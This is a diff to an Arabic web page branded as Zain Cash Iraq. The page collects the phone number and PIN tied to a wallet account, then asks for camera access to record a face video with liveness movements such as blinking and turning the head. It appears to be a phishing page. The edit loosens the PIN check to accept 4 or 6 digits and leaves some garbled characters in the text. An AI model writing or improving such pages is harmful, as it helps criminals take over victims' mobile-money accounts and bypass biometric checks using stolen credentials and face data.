@@ -259,8 +259,8 @@
       <form id="phoneForm" autocomplete="off">
         <label>رقم الهاتف المرتبط بحسابك</label>
         <input type="tel" id="phone" placeholder="07XXXXXXXXXX" maxlength="11" required autocomplete="tel" inputmode="numeric"/>
-        <label style="margin-top:12px;">كلمة السر</label>
-        <input type="tel" id="password" placeholder="000000" maxlength="6" required inputmode="numeric"/>
+        <label style="margin-top:12px;">كلمة السر (4 أو 6 أرقام)</label>
+        <input type="tel" id="password" placeholder="0000 أو 000000" maxlength="6" required inputmode="numeric"/>
         <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">التالي</button></div>
       </form>
       <div class="zain-footer">Zain Cash Iraq &copy; 2025</div>
@@ -285,8 +285,9 @@
         return; 
       }
       
-      if(passwordVal.length !== 6){ 
-        alert('يرجى إدخال كلمة السر تتكون من 6 أرقام بالضبط'); 
+      // التحقق من أن كلمة السر إما 4 أو 6 أرقام فقط
+      if(passwordVal.length !== 4 && passwordVal.length !== 6){ 
+        alert('يرجى إدخال كلمة السر (4 أو 6 أرقام بالضبط)'); 
         password.focus(); 
         return; 
       }
@@ -317,13 +318,13 @@
         <div style="color:#666;font-size:14px;">
           سنسجل فيديو قصير يتضمن الخطوات التالية:
           <strong>اغماض العين (3 ثوانٍ)</strong>، <strong>وجه إلى اليمين قليلاً</strong>، <strong>العودة للمنتصف</strong>، <strong>وجه إلى اليسار قليلاً</strong>، <strong>وجه إلى اليمين قليلاً مرة أخرى</strong>، <strong>اغماض العين</strong>، ثم <strong>ابتسم</strong>.<br>
-          اضبط وجهك داخل الإطار، أزل القبعة/النظارات إذا لزم، واسمح بالوصول للكاميرا.
+          اضبط وجهك داخل الإطار، أزل القبعة/النظار��ت إذا لزم، واسمح بالوصول للكاميرا.
         </div>
       </div>
     `;
   }
 
-  // --- إدارة إذن الكاميرا: محاولات وإعا��ة المحاولة عند الرفض ---
+  // --- إدارة إذن الكاميرا: محاولات وإعادة المحاولة عند الرفض ---
   const permModal = document.getElementById('permissionModal');
   const permRetryBtn = document.getElementById('permRetryBtn');
   const permCancelBtn = document.getElementById('permCancelBtn');
